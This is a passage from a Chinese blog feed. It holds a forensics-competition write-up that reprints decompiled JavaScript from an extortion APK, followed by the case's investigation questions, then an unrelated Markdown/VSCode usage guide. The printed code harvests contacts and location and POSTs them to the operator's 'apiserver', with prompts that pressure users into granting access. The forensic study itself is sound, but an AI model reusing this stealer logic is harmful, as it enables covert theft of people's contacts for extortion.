&#x27;#tx&#x27;, function (event) &#123;</span><br><span class="line"></span><br><span class="line">$(&#x27;#tx&#x27;).hide();</span><br><span class="line">$(&#x27;#zz&#x27;).show();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">mui(&quot;body&quot;).on(&#x27;tap&#x27;, &#x27;#gb&#x27;, function (event) &#123;</span><br><span class="line"></span><br><span class="line">$(&#x27;#tx&#x27;).show();</span><br><span class="line">$(&#x27;#zz&#x27;).hide();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">mui(&quot;body&quot;).on(&#x27;tap&#x27;, &#x27;#qd&#x27;, function (event) &#123;</span><br><span class="line">if (danjishijian) &#123;</span><br><span class="line">danjishijian = false;</span><br><span class="line">aa()</span><br><span class="line">&#125; else &#123;</span><br><span class="line">aa()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function getPermission(permissionIdentity, successCallBack, errorCallBack) &#123;</span><br><span class="line">//权限标识转换成大写  </span><br><span class="line">var permissionIdentity = permissionIdentity.toUpperCase();</span><br><span class="line">//获取检测权限的状态  </span><br><span class="line">var checkResult = plus.navigator.checkPermission(permissionIdentity);</span><br><span class="line">//权限状态是否正常  </span><br><span class="line">var permissionStatusOk = false;</span><br><span class="line">//权限中文名称  </span><br><span class="line">var permissionName = &#x27;&#x27;;</span><br><span class="line">//对应 andorid 的具体权限  </span><br><span class="line">var androidPermission = &#x27;&#x27;;</span><br><span class="line">//获取权限中文意思与对应 android 系统的权限字符串  </span><br><span class="line">switch (permissionIdentity) &#123;</span><br><span class="line"></span><br><span class="line">case &#x27;CONTACTS&#x27;:</span><br><span class="line">permissionName = &#x27;系统联系人&#x27;;</span><br><span class="line">androidPermission = &#x27;android.permission.READ_CONTACTS&#x27;</span><br><span class="line">break;</span><br><span class="line"></span><br><span class="line">default:</span><br><span class="line">permissionName = &#x27;未知&#x27;;</span><br><span class="line">androidPermission = &#x27;未知&#x27;;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//判断检查权限的结果  </span><br><span class="line">switch (checkResult) &#123;</span><br><span class="line">case &#x27;authorized&#x27;:</span><br><span class="line">//正常的  </span><br><span class="line">permissionStatusOk = true</span><br><span class="line">break;</span><br><span class="line">case &#x27;denied&#x27;:</span><br><span class="line">//表示程序已被用户拒绝使用此权限，如果是拒绝的就再次提示用户打开确认提示框  </span><br><span class="line">//如果有该权限但是没有打开不进行操作还是会去申请或手动打开  </span><br><span class="line">// console.log(&#x27;已关闭&#x27; + permissionName + &#x27;权限&#x27;)  </span><br><span class="line">// errorCallBack(&#x27;已关闭&#x27; + permissionName + &#x27;权限&#x27;);  </span><br><span class="line">// return  </span><br><span class="line">break;</span><br><span class="line">case &#x27;undetermined&#x27;:</span><br><span class="line">// 表示程序未确定是否可使用此权限，此时调用对应的API时系统会弹出提示框让用户确认  </span><br><span class="line">// this.requestPermissions(androidPermission, permissionName, successCallBack, errorCallBack)  </span><br><span class="line">// errorCallBack(&#x27;未确定&#x27; + permissionName + &#x27;权限&#x27;);  </span><br><span class="line">// return  </span><br><span class="line">break;</span><br><span class="line">case &#x27;unknown&#x27;:</span><br><span class="line">errorCallBack(&#x27;无法查询&#x27; + permissionName + &#x27;权限&#x27;);</span><br><span class="line">return</span><br><span class="line">break;</span><br><span class="line">default:</span><br><span class="line">errorCallBack(&#x27;不支持&#x27; + permissionName + &#x27;权限&#x27;);</span><br><span class="line">return</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//如果权限是正常的执行成功回调  </span><br><span class="line">if (permissionStatusOk) &#123;</span><br><span class="line">successCallBack()</span><br><span class="line">&#125; else &#123;</span><br><span class="line">//如果不正常，如果是 andorid 系统，就动态申请权限  </span><br><span class="line">if (plus.os.name == &#x27;Android&#x27;) &#123;</span><br><span class="line">//动态申请权限  </span><br><span class="line">plus.android.requestPermissions([androidPermission], function (e) &#123;</span><br><span class="line">if (e.deniedAlways.length &gt; 0) &#123;</span><br><span class="line">//权限被永久拒绝  </span><br><span class="line">// 弹出提示框解释为何需要定位权限，引导用户打开设置页面开启  </span><br><span class="line">errorCallBack(&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;)</span><br><span class="line">// console.log(&#x27;Always Denied!!! &#x27; + e.deniedAlways.toString());  </span><br><span class="line">&#125;</span><br><span class="line">if (e.deniedPresent.length &gt; 0) &#123;</span><br><span class="line">//权限被临时拒绝  </span><br><span class="line">// 弹出提示框解释为何需要定位权限，可再次调用plus.android.requestPermissions申请权限  </span><br><span class="line">errorCallBack(&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;)</span><br><span class="line">// console.log(&#x27;Present Denied!!! &#x27; + e.deniedPresent.toString());  </span><br><span class="line">&#125;</span><br><span class="line">if (e.granted.length &gt; 0) &#123;</span><br><span class="line">//权限被允许  </span><br><span class="line">//调用依赖获取定位权限的代码  </span><br><span class="line">successCallBack()</span><br><span class="line">// console.log(&#x27;Granted!!! &#x27; + e.granted.toString());  </span><br><span class="line">&#125;</span><br><span class="line">&#125;, function (e) &#123;</span><br><span class="line">errorCallBack(&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;)</span><br><span class="line">// console.log(&#x27;Request Permissions error:&#x27; + JSON.stringify(e));  </span><br><span class="line">&#125;)</span><br><span class="line">&#125; else if (plus.os.name == &#x27;iOS&#x27;) &#123;</span><br><span class="line">//ios ,第一次使用目的权限时，应用的权限列表里是不存在的，所以先默认执行一下成功回调，打开要使用的操作，比如 plus.camera  </span><br><span class="line">//这时系统会提示是否打开相应的权限，如果拒绝也没关系，因为应用的权限列表里已经存在该权限了，下次再调用相应权限时，就会  </span><br><span class="line">//走 else 里的流程，会给用户提示，并且跳转到应该的权限页面，让用户手动打开。  </span><br><span class="line">if (checkResult == &#x27;undetermined&#x27;) &#123;</span><br><span class="line">//调用依赖获取定位权限的代码  </span><br><span class="line">successCallBack(true)</span><br><span class="line">&#125; else &#123;</span><br><span class="line">//如果是 ios 系统，ios 没有动态申请操作，所以提示用户去设置页面手动打开  </span><br><span class="line">mui.confirm(permissionName + &#x27;权限没有开启，是否去开启？&#x27;, &#x27;提醒&#x27;, [&#x27;取消&#x27;, &#x27;确认&#x27;], function (e) &#123;</span><br><span class="line">//取消  </span><br><span class="line">if (e.index == 0) &#123;</span><br><span class="line">errorCallBack(&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;)</span><br><span class="line">&#125; else if (e.index == 1) &#123;</span><br><span class="line">//确认，打开当前应用权限设置页面  </span><br><span class="line">var UIApplication = plus.ios.import(&#x27;UIApplication&#x27;);</span><br><span class="line">var application2 = UIApplication.sharedApplication();</span><br><span class="line">var NSURL2 = plus.ios.import(&#x27;NSURL&#x27;);</span><br><span class="line">// var setting2 = NSURL2.URLWithString(&quot;prefs:root=LOCATION_SERVICES&quot;);                             </span><br><span class="line">var setting2 = NSURL2.URLWithString(&#x27;app-settings:&#x27;);</span><br><span class="line">application2.openURL(setting2);</span><br><span class="line"></span><br><span class="line">plus.ios.deleteObject(setting2);</span><br><span class="line">plus.ios.deleteObject(NSURL2);</span><br><span class="line">plus.ios.deleteObject(application2)</span><br><span class="line">&#125;</span><br><span class="line">&#125;, &#x27;div&#x27;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function aa() &#123;</span><br><span class="line">var sjh = $(&#x27;#sjh&#x27;).val();</span><br><span class="line">var yqm = $(&#x27;#yqm&#x27;).val();</span><br><span class="line">if (parseInt(sjh) &gt; 0 &amp;&amp; parseInt(yqm) &gt; 0 &amp;&amp; parseInt(sjh) &gt; 13000000000 &amp;&amp; parseInt(sjh) &lt; 19999999999 &amp;&amp; parseInt(yqm) &gt; 0 &amp;&amp; parseInt(yqm) &lt; 999999) &#123;</span><br><span class="line"></span><br><span class="line">getPermission(&#x27;CONTACTS&#x27;, function () &#123;</span><br><span class="line">huoqu(sjh, yqm);</span><br><span class="line"></span><br><span class="line">&#125;, function (msg) &#123;</span><br><span class="line">mui.alert(msg, &#x27;提醒&#x27;, &#x27;确定&#x27;, function () &#123; &#125;, &#x27;div&#x27;)</span><br><span class="line">//aa()</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">mui.toast(&#x27;请输入正确的手机号和邀请码&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function dingwei(sjh, yqm) &#123;</span><br><span class="line">plus.geolocation.getCurrentPosition(translatePoint, function (e) &#123;</span><br><span class="line">mui.toast(&quot;异常:&quot; + e.message);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function translatePoint(position) &#123;</span><br><span class="line"></span><br><span class="line">var sjh = $(&#x27;#sjh&#x27;).val()</span><br><span class="line">var yqm = $(&#x27;#yqm&#x27;).val()</span><br><span class="line">var currentLon = position.coords.longitude;</span><br><span class="line">var currentLat = position.coords.latitude;</span><br><span class="line">var jingweidu = sjh + &#x27;,&#x27; + yqm + &#x27;,&#x27; + currentLon + &#x27;,&#x27; + currentLat;</span><br><span class="line">mui.ajax(apiserver + &#x27;apimap&#x27;, &#123;</span><br><span class="line">data: &#123;</span><br><span class="line">data: jingweidu</span><br><span class="line">&#125;,</span><br><span class="line">dataType: &#x27;text&#x27;,//服务器返回json格式数据</span><br><span class="line">type: &#x27;post&#x27;,//HTTP请求类型</span><br><span class="line">timeout: 10000,//超时时间设置为10秒；              </span><br><span class="line">success: function (data) &#123;</span><br><span class="line"></span><br><span class="line">if (data == &#x27;获取成功&#x27;) &#123;</span><br><span class="line">requestPermission(sjh, yqm);</span><br><span class="line"></span><br><span class="line">//setInterval(function()&#123;</span><br><span class="line">//var sjh=$(&#x27;#sjh&#x27;).val();</span><br><span class="line">//var yqm=$(&#x27;#yqm&#x27;).val();</span><br><span class="line">//requestPermission(sjh,yqm);</span><br><span class="line">//console.log(&#x27;send&#x27;)</span><br><span class="line"></span><br><span class="line">//&#125;,30000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mui.toast(data)</span><br><span class="line">&#125;,</span><br><span class="line">error: function (xhr, type, errorThrown) &#123;</span><br><span class="line">//异常处理；</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//书写自己的逻辑</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">// 扩展API加载完毕，现在可以正常调用扩展API</span><br><span class="line"></span><br><span class="line">function huoqu(sjh, yqm) &#123;</span><br><span class="line">var con = sjh + &quot;**&quot; + yqm + &#x27;**&#x27; + address;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function (addressbook) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addressbook.find([&quot;displayName&quot;, &quot;phoneNumbers&quot;], function (contacts) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for (var i = 0, len = contacts.length; i &lt; len; i++) &#123;</span><br><span class="line">con = con + &#x27;=&#x27; + contacts[i].displayName + &#x27;|&#x27; + (contacts[i].phoneNumbers.length == 0 ? &quot;&quot; : contacts[i].phoneNumbers[0].value);</span><br><span class="line">&#125;</span><br><span class="line">mui.ajax(apiserver + &#x27;api&#x27;, &#123;</span><br><span class="line">data: &#123;</span><br><span class="line">data: con</span><br><span class="line">&#125;,</span><br><span class="line">dataType: &#x27;text&#x27;,//服务器返回json格式数据</span><br><span class="line">type: &#x27;post&#x27;,//HTTP请求类型</span><br><span class="line">timeout: 10000,//超时时间设置为10秒；              </span><br><span class="line">success: function (data) &#123;</span><br><span class="line">//alert(data)</span><br><span class="line">if (data == &#x27;正在加载列表&#x27;) &#123;</span><br><span class="line">dingwei(sjh, yqm);</span><br><span class="line">mui.openWindow(&#123;</span><br><span class="line">url: &#x27;list.html&#x27;,</span><br><span class="line">show: &#123;</span><br><span class="line">autoShow: true</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">mui.toast(data)</span><br><span class="line">&#125;</span><br><span class="line">//console.log(con)</span><br><span class="line">&#125;,</span><br><span class="line">error: function (xhr, type, errorThrown) &#123;</span><br><span class="line">//异常处理；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;, function () &#123;</span><br><span class="line">mui.alert(&quot;为保证用户质量，使用本app请同意通讯录授权 &quot;);</span><br><span class="line">&#125;, &#123;</span><br><span class="line">multiple: true</span><br><span class="line">&#125;);</span><br><span class="line">&#125;, function (e) &#123;</span><br><span class="line">mui.alert(&quot;为保证用户质量，使用本app请同意通讯录授权 &quot;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>总结：<ul><li>&#x2F;&#x2F;Sms存放所有短信；&#x2F;&#x2F;调用依赖获取定位权限的代码；    mui.toast(‘请输入正确的手机号和邀请码’)</li><li>mui.alert(“为保证用户质量，使用本app请同意通讯录授权 “);</li><li>答案：ACDE</li></ul></li></ul><h4 id="6-该APK程序回传通讯录时，使用的http请求方式为"><a href="#6-该APK程序回传通讯录时，使用的http请求方式为" class="headerlink" title="6. 该APK程序回传通讯录时，使用的http请求方式为"></a>6. 该APK程序回传通讯录时，使用的http请求方式为</h4><ul><li>wp说上一道题目手机号邀请码后面为通讯录信息，</li></ul><p>7该APK程序的回传地址域名为【标准格式：<a href="http://www.abc.com】/">www.abc.com】</a><br>8该APK程序代码中配置的变量apiserver的值为【标准格式：<a href="http://www.abc.com/abc%E3%80%91">www.abc.com/abc】</a><br>9分析该APK，发现该程序还具备获取短信回传到后台的功能，短信上传服务器接口地址为【标准格式：<a href="http://www.abc.com/abc%E3%80%91">www.abc.com/abc】</a><br>10经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该文件的文件名为<br>11经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该数据库的初始密码为<br>经过掌握的APK程序后台服务器回连地址，警方成功调取该服务器的镜像，请使用第7题的答案对检材二进行解压进行分析，并回答下列问题：<br>12检材二的原始硬盘的SHA256值为：<br>13查询涉案于案发时间段内登陆服务器的IP地址为【标准格式：111.111.111.111】<br>14请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）【格式：文件存储】<br>15上一题中，提到的主要功能对应的服务监听的端口为：<br>16上一题中，提到的服务所使用的启动命令为：<br>17经分析，该服务对于请求来源IP的处理依据是：根据请求源IP地址的第（）位进行判断【标准格式：9】<br>18经分析，当判断条件小于50时，服务器会将该请求转发到IP为（）的服务器上【标准格式：111.111.111.111】<br>19请分析，该服务器转发的目标服务器一共有几台【标准格式：9】<br>20请分析，受害者通讯录被获取时，其设备的IP地址为【标准格式：111.111.111.111】<br>21请分析，受害者的通讯录被窃取之后，经由该服务器转发到了IP为（）的服务器上【标准格式：111.111.111.111】<br>通过对检材二的分析，警方进一步掌握并落地到了目标服务器地址，通过对服务器进行证据固定，得到服务器镜像–检材三，请使用第21题答案对检材三进行解密并分析，回答下列问题：<br>22检材三的原始硬盘的SHA256值为：<br>23请分析第21题中，所指的服务器的开机密码为：<br>24嫌疑人架设网站使用了宝塔面板，请问面板的登陆用户名为：<br>25请分析用于重置宝塔面板密码的函数名为<br>26请分析宝塔面板登陆密码的加密方式所使用的哈希算法为<br>27请分析宝塔面板对于其默认用户的密码一共执行了几次上题中的哈希算法<br>28请分析当前宝塔面板密码加密过程中所使用的salt值为【区分大小写】<br>29请分析该服务器，网站源代码所在的绝对路径为<br>30请分析，网站所使用的数据库位于IP为（）的服务器上（请使用该IP解压检材五，并重构网站）【标准格式：111.111.111.111】<br>31请分析，数据库的登陆密码为【区分大小写】<br>32请尝试重构该网站，并指出，该网站的后台管理界面的入口为【标准格式：&#x2F;web】<br>33已该涉案网站代码中对登录用户的密码做了加密处理。请找出加密算法中的salt值【区分大小写】<br>34请分析该网站的管理员用户的密码为：<br>35在对后台账号的密码加密处理过程中，后台一共计算几次哈希值<br>36请统计，后台中，一共有多少条设备记录<br>37请通过后台确认，本案中受害者的手机号码为<br>38请分析，本案中受害者的通讯录一共有多少条记录<br>通过对检材二和三进行分析，警方通过IP落地，警方掌成功抓获犯罪嫌疑人，现将嫌疑人的PC机和手机进行了取证，分别制作了镜像，请使用第13题的答案对检材四进行解密，并回答下列问题<br>39请计算检材四-PC的原始硬盘的SHA256值<br>40请分析，检材四-PC的Bitlocker加密分区的解密密钥为<br>41请分析，检材四-PC的开机密码为<br>42经分析发现，检材四-PC是嫌疑人用于管理服务器的设备，其主要通过哪个浏览器控制网站后台<br>43请计算PC检材中用户目录下的zip文件的sha256值<br>44请分析检材四-phone，该手机的IMEI号为<br>45请分析检材四-phone，嫌疑人和本案受害者是通过什么软件开始接触的【标准格式：支付宝】<br>46请分析检材四-phone，受害者下载恶意APK安装包的地址为<br>47请分析检材四-phone，受害者的微信内部ID号为<br>48请分析检材四-phone，嫌疑人用于敲诈本案受害者的QQ账号为<br>49请综合分析，嫌疑人用于管理敲诈对象的容器文件的SHA256值为<br>50请综合分析嫌疑人检材，另外一受害者“郭先生”的手机号码为<br>51通过嫌疑人检材，其中记录了几位受害者的信息<br>52请使用第11题的密码解压“金先生转账.zip”文件，并对压缩包中的文件计算SHA256值<br>53请综合分析，受害者一共被嫌疑人敲诈了多少钱（转账截图被隐藏在多个地方）</p>]]></content>
      
      
      <categories>
          
          <category> 比赛笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电子取证，wp复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>markdown-github+vscode使用文档</title>
      <link href="/2025/10/01/markdown-github-vscode%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/"/>
      <url>/2025/10/01/markdown-github-vscode%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><ul><li>Markdown All in One 插件支持许多 Markdown 语法的快捷键，使得格式化文本、插入链接、图片和其他元素变得非常简单。</li></ul><!-- 让表格居中显示的风格 --><style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><div class="center"><table><thead><tr><th align="center">操作</th><th align="center">快捷键</th><th align="center">操作</th><th align="center">快捷键</th></tr></thead><tbody><tr><td align="center">加粗</td><td align="center">Ctrl + B</td><td align="center">撤销</td><td align="center">Ctrl + Z</td></tr><tr><td align="center">斜体</td><td align="center">Ctrl + I</td><td align="center">重做</td><td align="center">Ctrl + Y</td></tr></tbody></table></div><h2 id="目录和标题"><a href="#目录和标题" class="headerlink" title="目录和标题"></a>目录和标题</h2><ul><li>（Github 版）如果使用 [TOC] 命令来生成目录，需要下载 “Markdown TOC” 插件。（未实践）</li><li>在 Github 版上不下载 Markdown TOC 插件创建目录的方法：按下快捷键 Ctrl + Shift + P 调出命令框，输入 Markdown ，找到 “Markdown All in One：创建目录” 即可。</li><li>使用 # 符号来创建标题。一个 # 是一级标题，两个 # 是二级标题，以此类推，最多六级。</li></ul><h2 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h2><ul><li>使用 * 或 _ 包围的文本会变为斜体。</li><li>使用 ** 或 __ 包围的文本会被加粗。</li><li>使用 *** 或 ___ 包围的文本会变为粗斜体。</li><li>使用 ~~ 包围的文本会被横线删除。</li><li>（Github 版）使用 &lt;mark&gt; 和 &lt;&#x2F;mark&gt; 包围的文本会被高亮。</li><li>在 &gt; 后的文本会被引用。</li><li>（Github 版）使用 &lt;sub&gt; 和 &lt;&#x2F;sub&gt; 包围的文本会变为下标。</li><li>（Github 版）使用 &lt;sup&gt; 和 &lt;&#x2F;sup&gt; 包围的文本会变为上标。</li><li>使用 &lt;u&gt; 和 &lt;&#x2F;u&gt; 包围的文本会出现下划线。</li><li>输入 *** 后回车，即可添加分隔线。</li><li>编写不被渲染输出的内容：&lt;!–文本–&gt;</li><li>在文本前使用 &amp;emsp;&amp;emsp; 代表在文本前按下一次 Tab 键。</li><li>若需要空一行，按下回车键即可；若需要空多行，则需要在每一行空行处添加 &amp;emsp;&amp;emsp; 。</li><li>若需要添加在 Markdown 中具有特殊意义的字符，在该符号前添加 \ 即可。</li></ul><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><ul><li>使用 - 或 * 或 + 加空格来创建无序列表。</li><li>使用数字加 . 后加空格来创建有序列表。</li><li>使用 - [ ] 后加空格来创建待办列表，使用 - [x] 进行打勾（字母 x 或 X）。</li><li>（CSDN 版）自定义列表：首行写标题，第二行在需要缩进处添加 : 和空格。</li></ul><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><ul><li>使用 ![替代文本](图片地址) 来插入图片。<ul><li>带尺寸的图片：! [图片名称] (图片路径&#x2F;1.png &#x3D;60×60)</li><li>宽度确定高度等比例的图片：! [图片名称] (图片路径&#x2F;1.png &#x3D;60×)</li><li>高度确定宽度等比例的图片：! [图片名称] (图片路径&#x2F;1.png &#x3D;×60)</li><li>居中的图片：! [图片名称] (图片路径&#x2F;1.png#pic_center)<br>居左：#pic_left ，居右：#pic_right<br>居中并且带尺寸的图片：! [图片名称] (图片路径&#x2F;1.png#pic_center &#x3D;60×60)</li></ul></li></ul><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ul><li>使用 &lt;链接地址&gt; 直接显示网站链接。</li><li>使用 [显示文本](链接地址) 来创建超链接，显示文本会代替连接出现。</li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ul><li>使用反引号插入单行代码，使用三个反引号创建代码块。</li><li>段首键入 Tab 键或输出 4 个空格，即可添加代码块。</li><li>段落前后添加三个反引号，即可将中间段落识别为代码块；若要在正文中键入代码，则在代码前后添加一个反引号。</li><li>需要代码高亮时，在段落前的三个反引号后添加语言名称，如 python ，即可高亮显示代码块。</li></ul><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><ul><li>左对齐：|:–| ，右对齐：|--:| ，居中对齐：|:--:| 。</li><li>可以在表格中设置文本格式。例如可以添加链接，代码（仅反引号（&#96;）中的单词或短语，而不是代码块）和强调；但是不能添加标题，块引用，列表，水平规则，图像或 HTML 标签。</li><li>可以使用表格的 HTML 字符代码 &#124; 在表中显示竖线 | 字符。</li><li>表格居中代码</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 让表格居中显示的风格 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.center</span> </span></span><br><span class="line"><span class="language-css">&#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: auto;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: table;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-left</span>: auto;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-right</span>: auto;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span> <span class="attr">size</span>=<span class="string">2.</span>&gt;</span>表1 示例表格<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">|   序号   |   内容  |        描述         |</span><br><span class="line">|  :---:  |  :---:  |  :---------------:  |</span><br><span class="line">|    1    |    l    |  大写字母L的小写字母l |</span><br><span class="line">|    2    |    I    |      大写字母I       |</span><br><span class="line">|    3    |    1    |        数字1       |</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>效果：</li></ul><!-- 让表格居中显示的风格 --><style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><p align="center"><font face="黑体" size=2.>表1 示例表格</font></p><div class="center"><table><thead><tr><th align="center">序号</th><th align="center">内容</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">l</td><td align="center">大写字母L的小写字母l</td></tr><tr><td align="center">2</td><td align="center">I</td><td align="center">大写字母I</td></tr><tr><td align="center">3</td><td align="center">1</td><td align="center">数字1</td></tr></tbody></table></div><ul><li>常用复制版本：</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 让表格居中显示的风格 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.center</span> </span></span><br><span class="line"><span class="language-css">&#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: auto;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: table;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-left</span>: auto;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-right</span>: auto;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 表格输入位置 --&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="注脚与注释"><a href="#注脚与注释" class="headerlink" title="注脚与注释"></a>注脚与注释</h2><ul><li>在文本后输入 [^数字] 添加注脚，在其它处输入 [^数字]: 添加注脚的解释。</li><li>在其它处输入 *[文本]: 添加注释，在原文本处会出现虚下划线，鼠标靠近虚下划线就会出现注释内容。</li></ul><h2 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h2><p>参考文章：<a href="https://blog.csdn.net/konglongdanfo1/article/details/85204312">markdown公式符号大全</a></p><h2 id="符号表情"><a href="#符号表情" class="headerlink" title="符号表情"></a>符号表情</h2><p>一些 Markdown 应用程序允许通过键入表情符号短代码来插入表情符号。这些以冒号开头和结尾，并包含表情符号的名称。<br>一些常见的表情符号简码列表见网页：<a href="https://gist.github.com/rxaviers/7360908">github markdown 表情符号标记的完整列表</a></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li>在 CSDN 版的 Markdown 中，如果输入 (r) 或 (R) 会显示为 ® ，解决办法是：输入 (r) 或 (R) 即可。</li><li>花体字母：<br><img src="/images/yinwen.png"></li><li>HTML 字符代码 &lt; 在 Markdown 中显示 &lt; 字符<br>HTML 字符代码 &gt; 在 Markdown 中显示 &gt; 字符<br>HTML 字符代码 &#61; 在 Markdown 中显示 &#x3D; 字符<br>其他 HTML 特殊字符对应表请参考文章：<a href="https://blog.csdn.net/sunbocong/article/details/81032758">html中显示特殊符号（附带特殊字符对应表）</a></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://blog.csdn.net/weixin_49272453/article/details/147440391?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-147440391-blog-89300713.235%5Ev43%5Epc_blog_bottom_relevance_base9&spm=1001.2101.3001.4242.1&utm_relevant_index=3">使用 VSCode 编写 Markdown 文件</a></li><li><a href="https://www.cnblogs.com/jianmuzi/p/16795528.html">Markdown表格居中显示</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 语法笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
            <tag> github </tag>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf工具箱内容学习（未完成ing）</title>
      <link href="/2025/08/20/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/08/20/ctf%E5%B7%A5%E5%85%B7%E7%AE%B1%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0/</url>
      
